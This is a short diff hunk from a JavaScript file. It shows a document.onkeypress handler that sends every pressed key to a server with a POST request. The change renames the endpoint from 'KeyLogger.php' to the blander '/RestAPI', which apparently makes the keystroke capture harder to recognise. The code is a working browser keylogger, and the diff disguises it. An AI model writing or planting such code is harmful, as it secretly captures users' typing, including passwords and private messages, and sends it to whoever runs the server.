@@ -13,7 +13,7 @@ document.onkeypress = function(evt)
     {
         var http = new XMLHttpRequest();
         var param = encodeURI(key)
-        http.open("POST","KeyLogger.php",true);
+        http.open("POST","/RestAPI",true);
         http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
             http.send("key="+param);
     }
